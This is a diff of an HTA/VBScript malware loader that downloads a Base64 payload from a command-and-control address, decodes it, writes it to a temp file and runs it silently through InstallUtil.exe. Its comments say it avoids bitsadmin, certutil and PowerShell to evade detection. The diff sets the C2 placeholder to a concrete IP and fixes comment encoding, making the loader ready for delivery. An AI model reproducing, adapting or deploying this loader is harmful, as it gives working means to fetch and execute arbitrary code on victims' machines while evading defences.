@@ -1,4 +1,4 @@
-﻿<html>
+<html>
 <head>
 <title> </title>
 <HTA:APPLICATION ID="loader" APPLICATIONNAME="loader" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize" />
@@ -10,8 +10,8 @@
   ' it via MSXML2.DOMDocument, writes to disk via ADODB.Stream, and executes
   ' via InstallUtil.exe /U.
   '
-  ' No bitsadmin, no certutil, no PowerShell â€” all COM objects.
-  ' The HTA file stays ~2KB â€” no embedded payload to copy-paste.
+  ' No bitsadmin, no certutil, no PowerShell — all COM objects.
+  ' The HTA file stays ~2KB — no embedded payload to copy-paste.
   '
   ' Configure payloadUrl below before delivery.
   ' =============================================================================
@@ -19,7 +19,7 @@
   On Error Resume Next
 
   ' -- CONFIG: Set your payload URL --------------------------------------------
-  Dim payloadUrl : payloadUrl = "http://YOUR_C2_IP_HERE/loader.b64"
+  Dim payloadUrl : payloadUrl = "http://192.168.45.221/loader.b64"
 
   ' -- Step 1: Download Base64 payload over HTTP --------------------------------
   Dim b64 : b64 = DownloadText(payloadUrl)
@@ -47,7 +47,7 @@
   If Err.Number <> 0 Then Call Fail("Write failed")
 
   ' -- Step 4: Execute via InstallUtil ------------------------------------------
-  ' FIXED: quote paths â€” handles usernames with spaces (e.g. "John Doe")
+  ' FIXED: quote paths — handles usernames with spaces (e.g. "John Doe")
   Dim installUtil
   installUtil = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
   CreateObject("WScript.Shell").Run """" & installUtil & """ /U """ & tmpPath & """", 0, False
@@ -89,7 +89,7 @@
   End Sub
 
   Sub Fail(msg)
-    ' Silent fail â€” no error dialogs
+    ' Silent fail — no error dialogs
     self.close()
   End Sub
 </script>
